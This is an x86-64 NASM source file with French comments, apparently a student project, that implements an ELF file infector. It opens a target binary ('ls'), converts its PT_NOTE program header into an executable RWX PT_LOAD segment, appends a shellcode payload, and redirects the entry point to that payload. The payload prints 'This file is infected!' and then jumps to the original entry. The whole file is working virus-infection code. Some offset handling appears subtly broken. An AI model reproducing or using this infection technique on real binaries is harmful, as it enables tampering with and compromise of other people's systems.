;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;nasm -f elf64 -o programme.o projet_elf.s && ld -o programme programme.o

; section pour les constantes
section .data
    filename db 'ls', 0
    Elf_header_struct_size equ 64

    not_elf db 'The binary is not an ELF file', 0xA, 0  ; Erreur type elf
    not_elf_len equ $ - not_elf
    is_elf db 'The binary is an ELF', 0xA, 0  ; Success type elf
    is_elf_len equ $ - is_elf
    is_directory db 'This file is a directory', 0xA, 0  ; Erreur type fichier (dossier)
    is_directory_len equ $ - is_directory
    is_not_directory db 'The file is not a directory', 0xA, 0  ; Success type fichier (n'est pas un dossier)
    is_not_directory_len equ $ - is_not_directory
    if_pt_note_string db 'Found PT_Note', 0xA, 0  ; Success type fichier (n'est pas un dossier)
    if_pt_note_string_len equ $ - if_pt_note_string
    if_not_pt_note_string db 'Couldn t find PT_Note', 0xA, 0  ; Success type fichier (n'est pas un dossier)
    if_not_pt_note_string_len equ $ - if_not_pt_note_string  
    success_msg db 'Successfully infected the file', 0xA, 0
    success_msg_len equ $ - success_msg
    error_open db 'Error opening file', 0xA, 0   ; Message d'erreur lors de l'ouverture
    error_open_len equ $ - error_open  ; Longueur de la chaine
    error_stat db 'Error when calling stat', 0xA, 0   ; Message d'erreur lors de l'appel de stat
    error_stat_len equ $ - error_stat
    error_parse db 'Error when parsing the file', 0xA, 0 ; Message d'erreur du parsing
    error_parse_len equ $ - error_parse

    ; Structure pour le header ELF
    struc Elf_header_struct
        .e_ident: resb 16
        .e_type: resb 2
        .e_machine: resb 2
        .e_version: resb 4
        .e_entry: resb 8
        .e_phoff: resb 8
        .e_shoff: resb 8
        .e_flags: resb 4
        .e_ehsize: resb 2
        .e_phentsize: resb 2
        .e_phnum: resb 2
        .e_shentsize: resb 2
        .e_shnum: resb 2
        .e_shstrndx: resb 2
    endstruc

    align 4096 ; taille d'une page
    payload:
        ; Instructions simples
        db 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00    ; mov rax, 1 (lire)
        db 0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00    ; mov rdi, 1 (stdout)
        db 0x48, 0x8d, 0x35, 0x0c, 0x00, 0x00, 0x00    ; lea rsi, [rel msg]
        db 0x48, 0xc7, 0xc2, 0x14, 0x00, 0x00, 0x00    ; mov rdx, msg_len
        db 0x0f, 0x05                                   ; syscall
        
        db 0x48, 0xb8                                   ; movabs rax,
    jmp_offset: dq 0                                    ; offset pour le jmp
        db 0xff, 0xe0                                   ; jmp rax
        
    msg:
        db "This file is infected!", 0xa               ; Message à afficher quand on lance le binaire
    msg_len equ $ - msg
        align 4096                                     ; Alignement
    payload_len equ $ - payload         

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; section pour les variables
section .bss
    stat_buffer resb 144 ; 144 = buffer typique pour stat en x86_64
    elf_header resb 64 ; instance de elf_header_struct (à remplir avec les infos du header elf)
    program_header resb 56 ; instance de Elf64_Phdr (à remplir avec les infos du header de programme)
    fd resq 1 ; Pour sauvegarder le descripteur de fichier
    last_pt_load resq 1 ; Pour sauvegarder la fin du dernier segment LOAD
    phdr_offset resq 1 ; Offset des program headers
    temp_buffer resb 56 ; Buffer temporaire pour lire les program headers

section .text
global _start

_start:
    call cmp_stat_directory
    call open_file
    call read_file
    call cmp_header_elf
    call find_pt_note
    call find_last_pt_load
    call inject_payload
    jmp exit_program 

; Ouvrir le fichier
open_file:
    mov rax, 2                    ; numéro de syscall pour open
    mov rdi, filename             ; pointeur vers le nom du fichier
    mov rsi, 2                    ; flags : read write
    mov rdx, 0                ; mode : non utilisé ici
    syscall     

    ; Vérifie si le fichier a été ouvert avec succès
    cmp rax, 0
    jl open_error                 ; Si la valeur de retour < 0, c'est une erreur
    mov [fd], rax ; Sauvegarde le descripteur de fichier
    ret

    ; Afficher le message d'erreur si on a pas pu ouvrir le fichier
    open_error:
        mov rax, 1                    ; syscall pour écrire
        mov rdi, 1                    ; descripteur de fichier : stdout
        mov rsi, error_open       ; pointeur vers le message d'erreur
        mov rdx, error_open_len            ; longueur du message d'erreur
        syscall
        jmp exit_program

; Lire les premiers octets du fichier
read_file:
    mov rax, 0                    ; syscall pour lire
    mov rdi, [fd]
    mov rsi, elf_header         ; structure pour le header elf
    mov rdx, Elf_header_struct_size         ; nombre d'octets à lire
    syscall
    ret

cmp_header_elf:
    mov eax, dword [elf_header] ; début de la structure = .ELF
    cmp eax, 0x464c457f    ;.ELF en hexa (little endian)
    je is_elf_file ; si égal

    ;sinon
    print_not_elf:
        mov rax, 1 ; syscall pour écrire
        mov rdi, 1 ; descripteur de fichier : stdout
        mov rsi, not_elf; rsi = buffer (la valeur à écrire)
        mov rdx, not_elf_len ;(la taille du buffer)
        syscall
        jmp exit_program

    is_elf_file:
        mov rax, 1 ; syscall pour écrire
        mov rdi, 1 ; descripteur de fichier : stdout
        mov rsi, is_elf; rsi = buffer (la valeur à écrire)
        mov rdx, is_elf_len ; (la taille du buffer)
        syscall
        ret

cmp_stat_directory:
    mov rax, 4 ; syscall pour stat
    mov rdi, filename ; pointeur vers le nom du fichier
    mov rsi, stat_buffer ; buffer pour stocker la valeur de stat
    syscall

    ; test si stat a fonctionné
    test rax, rax
    js stat_error 

    ; Si pas d'erreurs
    mov eax, [stat_buffer + 24]  ; on tronque pour se placer à l'endroit st_mode (le type du fichier)
    and eax, 0xF000     ; On garde que les 4 bits qui indiquent le type, on met le reste à 0
    cmp eax, 0x4000     ; Compare avec la valeur de base d'un dossier
    je if_directory

    if_not_directory:
        mov rax, 1 ; syscall pour écrire
        mov rdi, 1 ; descripteur de fichier : stdout
        mov rsi, is_not_directory; rsi = la valeur à écrire
        mov rdx, is_not_directory_len ; la taille du buffer
        syscall
        ret

    if_directory:
        mov rax, 1 ; syscall pour écrire
        mov rdi, 1 ; descripteur de fichier : stdout
        mov rsi, is_directory; rsi = la valeur à écrire
        mov rdx, is_directory_len ; la taille du buffer
        syscall
        jmp exit_program

    stat_error:          
        mov rax, 1                    ; syscall pour écrire
        mov rdi, 1                    ; descripteur de fichier : stdout
        mov rsi, error_stat       ; pointeur vers le message d'erreur
        mov rdx, error_stat_len            ; longueur du message d'erreur
        syscall  
        jmp exit_program

find_pt_note:
    ; Obtenir l'offset des program headers
    mov rax, [elf_header + Elf_header_struct.e_phoff]
    mov [phdr_offset], rax

    movzx rcx, word [elf_header + Elf_header_struct.e_phnum]    ; rcx = nombre de program headers

    search_pt_note:
        push rcx ; Sauvegarder le compteur
        
        ; Lire le program header
        mov rax, 8          ; syscall pour lseek (changer le curseur)
        mov rdi, [fd] 
        mov rsi, [phdr_offset] ; offset pour le curseur
        mov rdx, 0        ; SEEK_SET = début du fichier
        syscall

        mov rax, 0          ; syscall pour lire
        mov rdi, [fd]
        mov rsi, program_header  ; buffer
        movzx rdx, word [elf_header + Elf_header_struct.e_phentsize]   ; Elf64_Phdr = 56 
        syscall

        ; Vérifier si c'est PT_NOTE
        cmp dword [program_header], 4    ; 4 =  PT_NOTE
        je if_pt_note

        ; Passer au header suivant
        add qword [phdr_offset], 56
        ; mettre à jour le compteur
        pop rcx 
        dec rcx 
        jnz search_pt_note ; loop

        if_not_pt_note:
            mov rax, 1
            mov rdi, 1
            mov rsi, if_not_pt_note_string
            mov rdx, if_not_pt_note_string_len
            syscall
            jmp exit_program

        if_pt_note:
            mov rax, 1 ; syscall pour écrire
            mov rdi, 1 ; descripteur de fichier : stdout
            mov rsi, if_pt_note_string; rsi = la valeur à écrire
            mov rdx, if_pt_note_string_len ; la taille du buffer
            syscall
            pop rcx  ; Restaurer la pile
            ret

find_last_pt_load:
    ; Trouver le dernier pt_load pour placer le payload
    mov qword [last_pt_load], 0  ; Initialisation à 0
    movzx rcx, word [elf_header + Elf_header_struct.e_phnum] ; rcx = nombre de program headers
    mov rax, [elf_header + Elf_header_struct.e_phoff] ; rax = offset des program headers

    search_segments:
        push rcx            ; Sauvegarder le compteur
        mov r8, rax        ; Utiliser r8 pour sauvegarder l'offset courant
        
        ; Lire le program header
        mov rax, 8          ; syscall pour lseek (changer le curseur)
        mov rdi, [fd]
        mov rsi, r8        ; offset pour le curseur
        mov rdx, 0        ; SEEK_SET = début du fichier
        syscall

        mov rax, 0          ; syscall pour lire
        mov rdi, [fd]
        mov rsi, temp_buffer ; Buffer temporaire des program headers pour trouver le last pt_load
        mov rdx, 56         ; taille d'un program header
        syscall

        ; Vérifier si c'est PT_LOAD
        cmp dword [temp_buffer], 1    ; 1 = PT_LOAD
        jne next_segment

        ; Calculer la fin du segment
        mov rax, [temp_buffer + 8]    ; p_vaddr
        add rax, [temp_buffer + 32]   ; + p_filesz
        add rax, 0x1000              ; Ajouter une page
        and rax, ~0xFFF              ; Alignement page
        
        ; Mettre à jour si c'est le plus grand
        cmp rax, [last_pt_load]
        jbe next_segment
        mov [last_pt_load], rax

    next_segment:
        mov rax, r8              ; Restaurer l'offset depuis r8
        add rax, 56              ; Taille d'un program header
        pop rcx                  ; Récupérer le compteur
        dec rcx                 ; Mettre à jour le compteur
        jnz search_segments ; loop
        ret

inject_payload:
    ; Sauvegarder point d'entrée original
    mov rax, [elf_header + Elf_header_struct.e_entry]
    mov [jmp_offset], rax      ; Sauvegarder l'entrée originale
    
    ; Calculer nouvelle adresse
    mov rax, [last_pt_load]
    add rax, 0x1000
    and rax, ~0xFFF         ; Alignement sur 4K
    mov [elf_header + Elf_header_struct.e_entry], rax ; Sauvegarder la nouvelle adresse

    ; Mettre à jour PT_NOTE
    mov dword [program_header], 1 ; 1 = PT_LOAD
    mov dword [program_header + 4], 7 ; RWX
    mov [program_header + 8], rax ; p_vaddr
    mov [program_header + 16], rax ; p_offset
    mov qword [program_header + 32], payload_len
    mov qword [program_header + 40], payload_len

    ; Écrire le nouveau program header
    mov rax, 8                      ; syscall pour lseek (changer le curseur)
    mov rdi, [fd]
    mov rsi, [phdr_offset]      ; offset pour le curseur
    mov rdx, 0                    ; SEEK_SET = curseur au début du fichier
    syscall

    mov rax, 1                      ; syscall pour écrire
    mov rdi, [fd]           ; écrire dans le fichier
    mov rsi, program_header
    mov rdx, 56     ; taille du programme header
    syscall

    ; Écrire le payload à la fin
    mov rax, 8             ; syscall pour lseek (changer le curseur)
    mov rdi, [fd]
    mov rsi, 0             ; offset pour le curseur
    mov rdx, 2             ; SEEK_END = curseur à la fin du fichier
    syscall

    mov rax, 1                      ; syscall pour écrire
    mov rdi, [fd]       ; écrire dans le fichier
    mov rsi, payload                
    mov rdx, payload_len           
    syscall

    ; Message de succès
    mov rax, 1  ; syscall pour écrire
    mov rdi, 1 ; stdout
    mov rsi, success_msg 
    mov rdx, success_msg_len    
    syscall

; Terminer le programme
exit_program:
    ; Fermer le fichier
    mov rdi, [fd]
    mov rax, 3 ; syscall pour fermer
    syscall

    ; Exit
    mov rax, 60                   ; syscall pour exit
    xor rdi, 0                  ; statut : 0
    syscall